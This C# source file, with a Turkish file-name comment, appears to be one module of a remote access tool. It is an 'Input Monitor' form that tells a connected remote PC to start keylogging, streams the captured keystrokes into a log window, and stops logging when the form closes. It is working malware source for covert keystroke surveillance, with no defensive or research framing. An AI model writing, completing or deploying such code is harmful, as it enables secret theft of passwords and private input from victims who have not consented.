// Dosya: Modules/InputMonitorForm.cs
//using App.Service.Modules;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace App.Service
{
    public class InputMonitorForm : ModuleForm, IRemoteModule
    {
        TextBox _log;
        Action<string> _send;
        bool _started;

        public InputMonitorForm() : base("Input Monitor")
        {
            Size = new Size(900, 540);
            _log = new TextBox
            {
                Multiline = true,
                ReadOnly = true,
                Dock = DockStyle.Fill,
                ScrollBars = ScrollBars.Vertical,
                BackColor = Color.FromArgb(6, 10, 8),
                ForeColor = Color.FromArgb(94, 240, 132),
                Font = new Font("Consolas", 9.5f),
                BorderStyle = BorderStyle.None
            };
            Body.Controls.Add(_log);
        }

        public void Initialize(ClientSession s, Action<string> send)
        {
            _send = send;
            Title.Text = "Input Monitor - " + s.UserPc;
            Shown += (e, a) => { _started = true; if (_send != null) _send("KEYLOG|START"); };
            FormClosed += (e, a) => { if (_started) { _started = false; try { if (_send != null) _send("KEYLOG|STOP"); } catch { } } };
        }

        public void AppendKey(string text)
        {
            if (IsDisposed) return;
            if (InvokeRequired) { try { BeginInvoke((MethodInvoker)delegate { AppendKey(text); }); } catch { } return; }
            bool title = text.StartsWith("[") && text.EndsWith("]");
            _log.AppendText(title ? "\r\n" + text + "\r\n" : text);
            _log.SelectionStart = _log.Text.Length;
            _log.ScrollToCaret();
        }
    }
}